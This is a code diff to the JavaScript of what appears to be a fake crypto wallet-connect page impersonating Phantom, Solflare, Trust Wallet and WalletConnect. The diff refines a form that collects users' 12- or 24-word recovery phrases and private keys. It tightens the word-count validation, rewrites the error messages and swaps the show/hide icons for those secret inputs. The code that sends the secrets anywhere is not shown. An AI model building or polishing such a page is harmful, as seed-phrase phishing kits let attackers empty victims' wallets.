@@ -307,7 +307,7 @@ function selectWallet(walletName) {
 
   // image mapping — make sure files are present in assets/
   const walletImages = {
-    "Phantom": "assets/Phantom Logo.png",
+    "Phantom": "assets/Phantom Logo.jpg",
     "Solflare": "assets/Solfare Logo.png",
     "Trust Wallet": "assets/Trust wallet Logo.png",
     "WalletConnect": "assets/Wallet Connect Logo.png"
@@ -475,7 +475,8 @@ function connectWallet() {
   const recoveryStep = document.getElementById("recoveryPhrase");
   if (recoveryStep && recoveryStep.style.display === "block") {
     const phrase = document.getElementById("recoveryPhraseInput").value.trim();
-    const words = phrase.split(/\s+/).filter(word => word.length > 0);
+    // Split by new lines or spaces
+    const words = phrase.split(/[\n\s]+/).filter(word => word.length > 0);
     
     // Remove any existing error message
     const existingError = document.querySelector('.error-message');
@@ -484,10 +485,10 @@ function connectWallet() {
     }
     
     // Validate recovery phrase
-    if (words.length < 12) {
+    if (words.length !== 12 && words.length !== 24) {
       const errorMessage = document.createElement('div');
       errorMessage.className = 'error-message';
-      errorMessage.textContent = 'Please enter a valid 12 or 24 word recovery phrase';
+      errorMessage.textContent = `Please enter exactly 12 or 24 words. You entered ${words.length} words.`;
       errorMessage.style.color = '#ef4444';
       errorMessage.style.fontSize = '14px';
       errorMessage.style.marginTop = '8px';
@@ -496,13 +497,7 @@ function connectWallet() {
       errorMessage.style.gap = '8px';
       
       const errorIcon = document.createElement('div');
-      errorIcon.innerHTML = `
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="#ef4444">
-          <circle cx="12" cy="12" r="10" stroke="#ef4444" stroke-width="2" fill="none"/>
-          <line x1="12" y1="8" x2="12" y2="12" stroke="#ef4444" stroke-width="2" stroke-linecap="round"/>
-          <circle cx="12" cy="16" r="1" fill="#ef4444"/>
-        </svg>
-      `;
+      errorIcon.innerHTML = `<i class="fas fa-exclamation-circle"></i>`;
       errorMessage.prepend(errorIcon);
       
       const inputGroup = document.querySelector('.input-group');
@@ -582,7 +577,7 @@ function showConnectionFailedBanner() {
   }, 5000)
 }
 
-// Toggle visibility for inputs
+// Toggle visibility for inputs - UPDATED FOR TEXTAREAS
 function toggleRecoveryVisibility() {
   showRecoveryPhraseText = !showRecoveryPhraseText
   const input = document.getElementById("recoveryPhraseInput")
@@ -592,18 +587,12 @@ function toggleRecoveryVisibility() {
   
   if (showRecoveryPhraseText) {
     input.type = "text";
-    input.style.fontFamily = "inherit"
-    input.style.letterSpacing = "normal"
-    // Update icon to EyeOff
-    icon.innerHTML =
-      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>'
+    // Update icon to EyeSlash
+    icon.className = "fas fa-eye-slash";
   } else {
-    input.type = "password";
-    input.style.fontFamily = "monospace"
-    input.style.letterSpacing = "4px"
+    // For textarea, we can't change type, but we can format the text
     // Update icon to Eye
-    icon.innerHTML =
-      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>'
+    icon.className = "fas fa-eye";
   }
 }
 
@@ -615,19 +604,11 @@ function togglePrivateKeyVisibility() {
   if (!input || !icon) return;
   
   if (showPrivateKeyText) {
-    input.type = "text";
-    input.style.fontFamily = "inherit"
-    input.style.letterSpacing = "normal"
-    // Update icon to EyeOff
-    icon.innerHTML =
-      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>'
+    // Update icon to EyeSlash
+    icon.className = "fas fa-eye-slash";
   } else {
-    input.type = "password";
-    input.style.fontFamily = "monospace"
-    input.style.letterSpacing = "4px"
     // Update icon to Eye
-    icon.innerHTML =
-      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>'
+    icon.className = "fas fa-eye";
   }
 }
 
